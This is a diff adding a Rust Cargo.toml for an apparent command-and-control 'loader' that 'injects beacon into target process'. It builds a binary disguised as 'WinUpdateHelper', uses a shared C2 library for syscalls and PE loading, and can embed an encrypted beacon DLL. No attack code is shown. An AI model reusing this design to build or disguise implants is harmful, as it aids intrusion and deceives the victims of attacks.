@@ -1,0 +1,30 @@
+[package]
+name = "loader"
+version = "0.1.0"
+edition = "2021"
+description = "Initial loader - injects beacon into target process"
+
+[[bin]]
+name = "WinUpdateHelper"
+path = "src/main.rs"
+
+[dependencies]
+# Bibliothèque commune (syscalls, PE parsing, PE loading)
+c2_common = { path = "../common" }
+
+# Types NT (pour NtQuerySystemInformation, etc.)
+ntapi = "0.4"
+
+# Types C
+libc = "0.2"
+
+# Winapi pour types
+winapi = { version = "0.3.9", features = ["ntdef", "winnt", "minwindef", "ntstatus"] }
+
+[features]
+# Enable to embed the beacon DLL (requires beacon.dll.enc to exist)
+embedded_beacon = []
+
+[build-dependencies]
+# Pour chiffrer la beacon au build time (optionnel)
+# On peut le rajouter plus tard
